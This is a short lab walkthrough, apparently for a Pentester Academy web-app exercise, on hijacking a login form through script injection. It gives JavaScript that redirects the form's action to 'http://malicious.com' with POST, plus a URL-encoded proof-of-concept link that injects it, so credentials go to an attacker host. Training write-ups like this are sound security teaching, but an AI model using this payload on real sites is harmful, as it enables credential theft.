## Task 3 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/3)</small>

Objectives:

1. Post the Username and Password to Attacker Controlled Server

By default, the form is submitted to the url mentioned in `action` attribute of form tag. If it's not set, the action will defaults to current url

<img src="https://i.ibb.co/n3ysrx9/image.png" alt="image" border="0">

Luckily here button behaviour is set to `Submit`. Also if you see there is only one form in whole page. So you can use [Document.forms](https://developer.mozilla.org/en-US/docs/Web/API/Document/forms) to get an array of forms. In this case, we have only 1 form. So modifying it would be like this

```js
document.forms[0].action = "http://malicious.com";
```

Now we are also supposed to `POST` the data. In form you can set the methods using `method=POST` attribute. If this is not mentioned, it defaults to `GET` method. [READ MORE](https://www.w3schools.com/html/html_forms_attributes.asp)

```js
document.forms[0].method = "POST";
```

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/3?url=%3Cscript%3Edocument.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2Fmalicious.com%22%3Bdocument.forms%5B0%5D.method%20%3D%20%22POST%22%3B%3C%2Fscript%3E)
